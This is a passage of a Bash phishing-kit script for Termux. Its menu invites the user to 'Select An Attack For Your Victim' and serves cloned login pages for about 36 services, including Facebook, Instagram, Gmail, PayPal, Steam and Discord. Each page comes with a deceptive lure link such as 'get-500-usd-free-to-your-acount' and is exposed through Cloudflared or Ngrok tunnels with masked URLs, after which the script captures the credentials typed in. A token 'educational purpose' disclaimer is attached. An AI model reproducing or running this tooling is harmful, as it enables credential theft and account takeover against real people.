                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner_small; }

        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
        cldflr_link1=${cldflr_link#https://}
        echo -e "\n${LG}[${GL}-${LG}]${i} URL 1 : ${GREEN}$cldflr_link"
        echo -e "\n${LG}[${GL}-${LG}]${i} URL 2 : ${GREEN}$mask@$cldflr_link1"
        capture_data
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/victim.wav &> /dev/null;
}

## Start localhost
start_localhost() {
	echo -e "\n${LG}[${GL}-${LG}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	if [[ ! -e "/system/bin/adb"  ]]; then
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/lhoat.wav &> /dev/null;
	else
	espeak -s 118 'local host has been started' &> /dev/null; 
	fi
	{ sleep 1; clear; banner_small; }
	echo -e "\n${LG}[${GL}-${LG}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/victim.wav &> /dev/null;
}



## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		
		${LG}[${GL}01${LG}]${G} Localhost    ${LG}[${BO}For Devs${LG}]
		${LG}[${GL}02${LG}]${G} Ngrok.io     ${LG}[${BO}Buggy${LG}]
		${LG}[${GL}03${LG}]${G} Cloudflared  ${LG}[${BO}NEW!${LG}]

	EOF
	read -p "${LG}[${GL}-${LG}]${GREEN} Select a port forwarding service : ${i}" &&
	if [[ ! -e "/system/bin/adb"  ]]; then
        play-audio /data/data/com.termux/files/home/kmphisher/.misc/port.wav &> /dev/null;
        else
        espeak -s 118 'Select your tunnelling option you want'&> /dev/null;  
	fi
	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${LG}[${GL}01${LG}]${G} Traditional Login Page
		${LG}[${GL}02${LG}]${G} Advanced Voting Poll Login Page
		${LG}[${GL}03${LG}]${G} Fake Security Login Page
		${LG}[${GL}04${LG}]${G} Facebook Messenger Login Page

	EOF

	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verifing-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			pass_for
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			pass_for
			website="fb_security"
			mask='http://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${LG}[${GL}01${LG}]${G} Traditional Login Page
		${LG}[${GL}02${LG}]${G} Auto Followers Login Page
		${LG}[${GL}03${LG}]${G} 1000 Followers Login Page
		${LG}[${GL}04${LG}]${G} Blue Badge Verify Login Page

	EOF

	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${LG}[${GL}01${LG}]${G} Gmail Old Login Page
		${LG}[${GL}02${LG}]${G} Gmail New Login Page
		${LG}[${GL}03${LG}]${G} Advanced Voting Poll

	EOF

	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${LG}[${GL}01${LG}]${G} Traditional Login Page
		${LG}[${GL}02${LG}]${G} Advanced Voting Poll Login Page

	EOF

	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='http://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## free fire
site_FF() {
	cat <<- EOF

		${LG}[${GL}01${LG}]${G} Free fire code 
		${LG}[${GL}02${LG}]${G} Free fire event
		${LG}[${GL}03${LG}]${G} free fire tournament 

	EOF

	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

        case $REPLY in
		1)
                        website="FFreward"
                        mask='http://garena-ff-reward'
                        tunnel_menu;;
                2)
                        website="FFlucky"
                  	mask='http://ff-event-garena'
                        tunnel_menu;;
		3)
		        website="FFtour"
			mask='http://ff-tourmt-reg'
                        tunnel_menu;;
                *)
                        echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
                        { sleep 1; clear; banner_small; site_FF; };;
        esac
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF

		${LG}[${GL}::${LG}]${BO} Select An Attack For Your Victim ${LG}[${GL}::${LG}]${G}

		${LG}[${GL}01${LG}]${G} Facebook       ${LG}[${GL}11${LG}]${G} Twitch       ${LG}[${GL}21${LG}]${G} DeviantArt		
		${LG}[${GL}02${LG}]${G} Instagram      ${LG}[${GL}12${LG}]${G} Pinterest    ${LG}[${GL}22${LG}]${G} Badoo
		${LG}[${GL}03${LG}]${G} Free Fire      ${LG}[${GL}13${LG}]${G} snapchat     ${LG}[${GL}23${LG}]${G} orgin
		${LG}[${GL}04${LG}]${G} Pubg           ${LG}[${GL}14${LG}]${G} Linkedin     ${LG}[${GL}24${LG}]${G} DropBox	
		${LG}[${GL}05${LG}]${G} Netflix        ${LG}[${GL}15${LG}]${G} Ebay         ${LG}[${GL}25${LG}]${G} Yahoo		
		${LG}[${GL}06${LG}]${G} Paypal         ${LG}[${GL}16${LG}]${G} Quora        ${LG}[${GL}26${LG}]${G} Wordpress
		${LG}[${GL}07${LG}]${G} Steam          ${LG}[${GL}17${LG}]${G} Protonmail   ${LG}[${GL}27${LG}]${G} Yandex			
		${LG}[${GL}08${LG}]${G} Twitter        ${LG}[${GL}18${LG}]${G} Spotify      ${LG}[${GL}28${LG}]${G} StackoverFlow
		${LG}[${GL}09${LG}]${G} Playstation    ${LG}[${GL}19${LG}]${G} Reddit       ${LG}[${GL}29${LG}]${G} Vk
		${LG}[${GL}10${LG}]${G} Tiktok         ${LG}[${GL}20${LG}]${G} Adobe        ${LG}[${GL}30${LG}]${G} XBOX
		${LG}[${GL}31${LG}]${G} Mediafire      ${LG}[${GL}32${LG}]${G} Gitlab       ${LG}[${GL}33${LG}]${G} Github
		${LG}[${GL}34${LG}]${G} Discod         ${LG}[${GL}35${LG}]${G} google	    ${LG}[${GL}36${LG}]${G} microsoft
		${LG}[${GL}99${LG}]${G} About          ${LG}[${GL}00${LG}]${G} Exit

	EOF
	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${i}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			pass_for
			site_instagram;;
		3 | 03)
			site_FF;;
		4 | 04)
			website="pubg"
			mask='http://unlimited-UC-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='http://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			pass_for
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='http://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='http://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='http://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='http://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='http://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='http://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='http://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='http://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='http://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='http://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='http://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='http://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='http://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='http://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
                       
			website="discord"
			mask='http://get-discord-nitro-free'
			tunnel_menu;;
                35)
			site_google;;
		36)
			website="FFlucky"
                        mask='http://ff-garena.com'
                        tunnel_menu;;
		37)
			echo ""
			echo -e $K"This tool is getting ready"$w                     
			if [[ ! -e "/system/bin/adb"  ]]; then
			play-audio /data/data/com.termux/files/home/kmphisher/.misc/Not.wav &> /dev/null;
			else
			espeak -s 118 'sorry this tool is getting ready. So kindly move to FFreward' &> /dev/null;
			fi
			echo -e $K"So kindly move to FFreward"$w
			echo ""
			main_menu
                        tunnel_menu;;
		99)
			about;;
		0 | 00)
			am start --user 0 -n com.instagram.android/com.instagram.android.activity.MainTabActivity -d https://instagram.com/hasanfq6 &> /dev/null;
			msg_exit;;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

               echo -e "thank's for using this script created by hasanfq be i will not responsible for any damage issued my this script this made for only educational purpose..!"

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu
